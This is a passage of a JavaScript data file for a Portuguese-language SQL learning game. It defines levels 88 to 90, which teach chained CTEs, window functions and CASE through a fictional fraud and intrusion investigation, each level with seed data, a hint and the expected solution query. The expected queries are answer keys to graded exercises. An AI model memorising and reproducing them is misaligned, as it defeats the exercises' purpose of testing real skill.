        example: "-- Primeira vez que o saldo de um produto em estoque ficou negativo\nWITH Saldo AS (\n    SELECT produto_id, movimento_id,\n        SUM(quantidade) OVER (\n            PARTITION BY produto_id ORDER BY movimento_id ASC\n        ) AS saldo_acumulado\n    FROM movimentos_estoque\n),\nPrimeiraRuptura AS (\n    SELECT *,\n        ROW_NUMBER() OVER (PARTITION BY produto_id ORDER BY movimento_id ASC) AS rn\n    FROM Saldo\n    WHERE saldo_acumulado < 0\n)\nSELECT * FROM PrimeiraRuptura WHERE rn = 1;"
    },
    schemaDDL: `
        CREATE TABLE card_operations (
            operation_id INTEGER PRIMARY KEY,
            account_id TEXT NOT NULL,
            amount REAL NOT NULL,
            operation_type TEXT NOT NULL,
            occurred_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO card_operations (operation_id, account_id, amount, operation_type, occurred_at) VALUES
        (1, 'ACC-10', 200, 'COMPRA', 1),
        (2, 'ACC-10', 1500, 'COMPRA', 2),
        (3, 'ACC-10', 6000, 'SAQUE', 3),
        (4, 'ACC-10', 7000, 'SAQUE', 4),
        (5, 'ACC-20', 5000, 'SAQUE', 1),
        (6, 'ACC-20', 100, 'COMPRA', 2),
        (7, 'ACC-20', 5000, 'SAQUE', 3),
        (8, 'ACC-30', 900, 'COMPRA', 1),
        (9, 'ACC-30', 1000, 'COMPRA', 2),
        (10, 'ACC-30', 8000, 'SAQUE', 3),
        (11, 'ACC-40', 100, 'COMPRA', 1),
        (12, 'ACC-40', 200, 'COMPRA', 2),
        (13, 'ACC-40', 300, 'COMPRA', 3),
        (14, 'ACC-10', 6000, 'SAQUE', 5);
    `,
    expectedQuery: `
        WITH RiscoClassificado AS (
            SELECT operation_id, account_id, amount,
                CASE
                    WHEN amount >= 5000 THEN 'ALTO'
                    WHEN amount >= 1000 THEN 'MEDIO'
                    ELSE 'BAIXO'
                END AS nivel_risco
            FROM card_operations
        ),
        RankingRisco AS (
            SELECT operation_id, account_id, amount, nivel_risco,
                RANK() OVER (
                    PARTITION BY account_id
                    ORDER BY amount DESC, operation_id ASC
                ) AS posicao
            FROM RiscoClassificado
            WHERE nivel_risco = 'ALTO'
        )
        SELECT account_id, operation_id, amount, nivel_risco
        FROM RankingRisco
        WHERE posicao = 1
        ORDER BY account_id ASC;
    `,
    hint: "Combine CASE WHEN para classificar nivel_risco em uma CTE, depois RANK() OVER (PARTITION BY account_id ORDER BY amount DESC, operation_id ASC) filtrando nivel_risco = 'ALTO' e mantendo posicao = 1."
},
{
    id: 88,
    tier: "avancado",
    certModule: "Desafios Combinados (CTE + Window + CASE)",
    title: "Nível 88: O Tamanho de Cada Ramo",
    briefing: "Renata, CEO da Aethelgard, quer saber qual dos seus três subordinados diretos comanda a maior estrutura de pessoal — informação crítica para decidir por onde começar a revisão de acessos.",
    objective: "Construa uma CTE recursiva chamada ArvoreCompleta que percorra toda a cadeia de subordinados a partir de 'Renata' (person_id = 1), atribuindo a cada pessoa um branch_root_id: para os subordinados diretos de Renata (depth = 1), branch_root_id é o próprio person_id; para todos os níveis abaixo, branch_root_id é herdado do nível anterior (use CASE WHEN sobre a profundidade do nível pai para decidir). Em seguida, construa uma segunda CTE que agrupe as linhas com depth >= 1 por branch_root_id, calculando o total de descendentes de cada subordinado direto como COUNT(*) - 1. Na consulta final, faça JOIN com reporting_chain para obter o nome, projetando person_id (a partir de branch_root_id), person_name e total_descendentes. Ordene por total_descendentes decrescente e person_id ascendente.",
    theory: {
        title: "Combinando CTEs, Window Functions e CASE",
        explanation: "Investigações complexas raramente se resolvem com uma única técnica isolada. Encadear múltiplas CTEs permite quebrar o raciocínio em etapas nomeadas, onde a saída de uma etapa alimenta a próxima — por exemplo, calcular uma métrica com uma window function em uma CTE e depois classificá-la ou filtrá-la em outra, combinando também expressões CASE WHEN quando é preciso categorizar valores. Esse encadeamento é o padrão mais poderoso do SQL analítico.",
        syntax: "WITH Etapa1 AS (\n    SELECT coluna_id, coluna_grupo,\n        FUNCAO_JANELA(coluna_valor) OVER (\n            PARTITION BY coluna_grupo ORDER BY coluna_tempo ASC\n        ) AS metrica\n    FROM tabela\n),\nEtapa2 AS (\n    SELECT *,\n        CASE WHEN metrica >= :limiar THEN 'ALERTA' ELSE NULL END AS status\n    FROM Etapa1\n)\nSELECT * FROM Etapa2 WHERE status IS NOT NULL;",
        example: "-- Primeira vez que o saldo de um produto em estoque ficou negativo\nWITH Saldo AS (\n    SELECT produto_id, movimento_id,\n        SUM(quantidade) OVER (\n            PARTITION BY produto_id ORDER BY movimento_id ASC\n        ) AS saldo_acumulado\n    FROM movimentos_estoque\n),\nPrimeiraRuptura AS (\n    SELECT *,\n        ROW_NUMBER() OVER (PARTITION BY produto_id ORDER BY movimento_id ASC) AS rn\n    FROM Saldo\n    WHERE saldo_acumulado < 0\n)\nSELECT * FROM PrimeiraRuptura WHERE rn = 1;"
    },
    schemaDDL: `
        CREATE TABLE reporting_chain (
            person_id INTEGER PRIMARY KEY,
            person_name TEXT NOT NULL,
            reports_to_id INTEGER
        );
    `,
    seedData: `
        INSERT INTO reporting_chain (person_id, person_name, reports_to_id) VALUES
        (1, 'Renata', NULL),
        (2, 'Bruno', 1),
        (3, 'Camila', 1),
        (4, 'Diego', 2),
        (5, 'Elisa', 2),
        (6, 'Fabio', 4),
        (7, 'Gina', 3),
        (8, 'Hugo', 3),
        (9, 'Ivo', 7),
        (10, 'Julia', 7),
        (11, 'Kaue', 9),
        (12, 'Lara', 1),
        (13, 'Marcos', NULL),
        (14, 'Nina', 13);
    `,
    expectedQuery: `
        WITH RECURSIVE ArvoreCompleta AS (
            SELECT person_id, reports_to_id, 0 AS depth, NULL AS branch_root_id
            FROM reporting_chain
            WHERE person_id = 1
            UNION ALL
            SELECT rc.person_id, rc.reports_to_id, ac.depth + 1,
                CASE WHEN ac.depth = 0 THEN rc.person_id ELSE ac.branch_root_id END AS branch_root_id
            FROM reporting_chain rc
            INNER JOIN ArvoreCompleta ac ON rc.reports_to_id = ac.person_id
        ),
        ContagemPorRamo AS (
            SELECT branch_root_id, COUNT(*) - 1 AS total_descendentes
            FROM ArvoreCompleta
            WHERE depth >= 1
            GROUP BY branch_root_id
        )
        SELECT cpr.branch_root_id AS person_id, rc.person_name, cpr.total_descendentes
        FROM ContagemPorRamo cpr
        JOIN reporting_chain rc ON rc.person_id = cpr.branch_root_id
        ORDER BY cpr.total_descendentes DESC, cpr.branch_root_id ASC;
    `,
    hint: "Na CTE recursiva, use CASE WHEN ac.depth = 0 THEN rc.person_id ELSE ac.branch_root_id END para propagar o 'ramo' de origem; depois agrupe com GROUP BY branch_root_id e COUNT(*) - 1, filtrando depth >= 1, e finalize com um JOIN em reporting_chain para obter o nome."
},
{
    id: 89,
    tier: "avancado",
    certModule: "Desafios Combinados (CTE + Window + CASE)",
    title: "Nível 89: A Queda Suspeita de Valor",
    briefing: "Um esquema de subfaturamento pode estar sendo usado para desviar mercadoria da Aethelgard sem levantar suspeitas contábeis. Maya quer localizar quedas bruscas no valor declarado de carga entre remessas consecutivas do mesmo fornecedor, já classificadas por gravidade.",
    objective: "Construa uma cadeia de CTEs. Primeiro calcule valor_anterior com LAG(cargo_value) particionado por supplier_id, ordenado por manifest_date ASC e manifest_id ASC como desempate. Em seguida, calcule queda_percentual como (valor_anterior - cargo_value) * 100.0 / valor_anterior, descartando linhas sem valor_anterior. Depois, classifique cada linha com CASE WHEN: 'CRITICO' se queda_percentual for maior ou igual a 70, 'ALERTA' se for maior ou igual a 50, e NULL caso contrário, como classificacao. Na consulta final, projete supplier_id, manifest_id, cargo_value, queda_percentual e classificacao, mantendo apenas linhas onde classificacao não for nula. Ordene por supplier_id ASC e manifest_id ASC.",
    theory: {
        title: "Combinando CTEs, Window Functions e CASE",
        explanation: "Investigações complexas raramente se resolvem com uma única técnica isolada. Encadear múltiplas CTEs permite quebrar o raciocínio em etapas nomeadas, onde a saída de uma etapa alimenta a próxima — por exemplo, calcular uma métrica com uma window function em uma CTE e depois classificá-la ou filtrá-la em outra, combinando também expressões CASE WHEN quando é preciso categorizar valores. Esse encadeamento é o padrão mais poderoso do SQL analítico.",
        syntax: "WITH Etapa1 AS (\n    SELECT coluna_id, coluna_grupo,\n        FUNCAO_JANELA(coluna_valor) OVER (\n            PARTITION BY coluna_grupo ORDER BY coluna_tempo ASC\n        ) AS metrica\n    FROM tabela\n),\nEtapa2 AS (\n    SELECT *,\n        CASE WHEN metrica >= :limiar THEN 'ALERTA' ELSE NULL END AS status\n    FROM Etapa1\n)\nSELECT * FROM Etapa2 WHERE status IS NOT NULL;",
        example: "-- Primeira vez que o saldo de um produto em estoque ficou negativo\nWITH Saldo AS (\n    SELECT produto_id, movimento_id,\n        SUM(quantidade) OVER (\n            PARTITION BY produto_id ORDER BY movimento_id ASC\n        ) AS saldo_acumulado\n    FROM movimentos_estoque\n),\nPrimeiraRuptura AS (\n    SELECT *,\n        ROW_NUMBER() OVER (PARTITION BY produto_id ORDER BY movimento_id ASC) AS rn\n    FROM Saldo\n    WHERE saldo_acumulado < 0\n)\nSELECT * FROM PrimeiraRuptura WHERE rn = 1;"
    },
    schemaDDL: `
        CREATE TABLE cargo_manifests (
            manifest_id INTEGER PRIMARY KEY,
            supplier_id TEXT NOT NULL,
            cargo_value REAL NOT NULL,
            manifest_date INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO cargo_manifests (manifest_id, supplier_id, cargo_value, manifest_date) VALUES
        (1, 'FORN-P', 10000, 1),
        (2, 'FORN-P', 4000, 2),
        (3, 'FORN-P', 3800, 3),
        (4, 'FORN-Q', 20000, 1),
        (5, 'FORN-Q', 5000, 2),
        (6, 'FORN-Q', 4800, 3),
        (7, 'FORN-R', 8000, 1),
        (8, 'FORN-R', 7000, 2),
        (9, 'FORN-R', 1750, 3),
        (10, 'FORN-S', 5000, 1),
        (11, 'FORN-S', 5100, 2),
        (12, 'FORN-S', 5200, 3),
        (13, 'FORN-P', 3700, 4),
        (14, 'FORN-Q', 4700, 4);
    `,
    expectedQuery: `
        WITH ValorAnterior AS (
            SELECT manifest_id, supplier_id, cargo_value,
                LAG(cargo_value) OVER (
                    PARTITION BY supplier_id
                    ORDER BY manifest_date ASC, manifest_id ASC
                ) AS valor_anterior
            FROM cargo_manifests
        ),
        VariacaoCarga AS (
            SELECT manifest_id, supplier_id, cargo_value, valor_anterior,
                (valor_anterior - cargo_value) * 100.0 / valor_anterior AS queda_percentual
            FROM ValorAnterior
            WHERE valor_anterior IS NOT NULL
        ),
        ClassificacaoRisco AS (
            SELECT manifest_id, supplier_id, cargo_value, queda_percentual,
                CASE
                    WHEN queda_percentual >= 70 THEN 'CRITICO'
                    WHEN queda_percentual >= 50 THEN 'ALERTA'
                    ELSE NULL
                END AS classificacao
            FROM VariacaoCarga
        )
        SELECT supplier_id, manifest_id, cargo_value, queda_percentual, classificacao
        FROM ClassificacaoRisco
        WHERE classificacao IS NOT NULL
        ORDER BY supplier_id ASC, manifest_id ASC;
    `,
    hint: "Encadeie três CTEs: LAG(cargo_value) OVER (PARTITION BY supplier_id ORDER BY manifest_date ASC, manifest_id ASC) para obter valor_anterior, depois calcule a queda percentual, e finalize com CASE WHEN para classificar em 'CRITICO' ou 'ALERTA'."
},
{
    id: 90,
    tier: "avancado",
    certModule: "Desafios Combinados (CTE + Window + CASE)",
    title: "Nível 90: O Penúltimo Login sob Investigação",
    briefing: "Última etapa da investigação: Maya isolou os usuários com histórico consistente de falhas de login, sinal de força bruta bem-sucedida. Agora ela precisa do PENÚLTIMO login de cada um desses usuários — o acesso que provavelmente antecedeu a invasão final.",
    objective: "Construa duas CTEs encadeadas. A primeira agrupa por user_id, contando o total de logins malsucedidos (login_success = 0) como falhas_totais, e classifica cada usuário com CASE WHEN em status_usuario: 'INVESTIGACAO' se falhas_totais for maior ou igual a 3, senão 'NORMAL'. A segunda faz JOIN de login_events com essa classificação, mantém apenas usuários com status_usuario = 'INVESTIGACAO', e aplica ROW_NUMBER() particionado por user_id, ordenado por login_at DESC e login_id DESC, como rn. Na consulta final, projete user_id, login_id, login_success e login_at como penultimo_login, mantendo apenas a linha com rn = 2 (o penúltimo login) de cada usuário sob investigação. Ordene por user_id ASC.",
    theory: {
        title: "Combinando CTEs, Window Functions e CASE",
        explanation: "Investigações complexas raramente se resolvem com uma única técnica isolada. Encadear múltiplas CTEs permite quebrar o raciocínio em etapas nomeadas, onde a saída de uma etapa alimenta a próxima — por exemplo, calcular uma métrica com uma window function em uma CTE e depois classificá-la ou filtrá-la em outra, combinando também expressões CASE WHEN quando é preciso categorizar valores. Esse encadeamento é o padrão mais poderoso do SQL analítico.",
        syntax: "WITH Etapa1 AS (\n    SELECT coluna_id, coluna_grupo,\n        FUNCAO_JANELA(coluna_valor) OVER (\n            PARTITION BY coluna_grupo ORDER BY coluna_tempo ASC\n        ) AS metrica\n    FROM tabela\n),\nEtapa2 AS (\n    SELECT *,\n        CASE WHEN metrica >= :limiar THEN 'ALERTA' ELSE NULL END AS status\n    FROM Etapa1\n)\nSELECT * FROM Etapa2 WHERE status IS NOT NULL;",
        example: "-- Primeira vez que o saldo de um produto em estoque ficou negativo\nWITH Saldo AS (\n    SELECT produto_id, movimento_id,\n        SUM(quantidade) OVER (\n            PARTITION BY produto_id ORDER BY movimento_id ASC\n        ) AS saldo_acumulado\n    FROM movimentos_estoque\n),\nPrimeiraRuptura AS (\n    SELECT *,\n        ROW_NUMBER() OVER (PARTITION BY produto_id ORDER BY movimento_id ASC) AS rn\n    FROM Saldo\n    WHERE saldo_acumulado < 0\n)\nSELECT * FROM PrimeiraRuptura WHERE rn = 1;"
    },
    schemaDDL: `
        CREATE TABLE login_events (
            login_id INTEGER PRIMARY KEY,
            user_id TEXT NOT NULL,
            login_success INTEGER NOT NULL,
            login_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO login_events (login_id, user_id, login_success, login_at) VALUES
        (1, 'USR-A', 0, 5000),
        (2, 'USR-A', 0, 5010),
        (3, 'USR-A', 0, 5020),
        (4, 'USR-A', 1, 5030),
        (5, 'USR-B', 0, 6000),
        (6, 'USR-B', 0, 6010),
        (7, 'USR-B', 0, 6020),
        (8, 'USR-B', 0, 6030),
        (9, 'USR-B', 1, 6040),
        (10, 'USR-C', 1, 7000),
        (11, 'USR-C', 0, 7010),
        (12, 'USR-C', 1, 7020),
        (13, 'USR-D', 1, 8000),
        (14, 'USR-D', 1, 8010);
    `,
    expectedQuery: `
        WITH PerfilUsuario AS (
            SELECT user_id,
                SUM(CASE WHEN login_success = 0 THEN 1 ELSE 0 END) AS falhas_totais,
                CASE
                    WHEN SUM(CASE WHEN login_success = 0 THEN 1 ELSE 0 END) >= 3 THEN 'INVESTIGACAO'
                    ELSE 'NORMAL'
                END AS status_usuario
            FROM login_events
            GROUP BY user_id
        ),
        LoginsRankeados AS (
            SELECT le.login_id, le.user_id, le.login_success, le.login_at,
                ROW_NUMBER() OVER (
                    PARTITION BY le.user_id
                    ORDER BY le.login_at DESC, le.login_id DESC
                ) AS rn
            FROM login_events le
            INNER JOIN PerfilUsuario pu ON pu.user_id = le.user_id
            WHERE pu.status_usuario = 'INVESTIGACAO'
        )
        SELECT user_id, login_id, login_success, login_at AS penultimo_login
        FROM LoginsRankeados
        WHERE rn = 2
        ORDER BY user_id ASC;
    `,
    hint: "Combine uma CTE de agregação com CASE WHEN para status_usuario, um JOIN filtrando 'INVESTIGACAO', e ROW_NUMBER() OVER (PARTITION BY user_id ORDER BY login_at DESC, login_id DESC), mantendo apenas rn = 2."
}

];

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { LEVELS, TIER_LABELS };
}
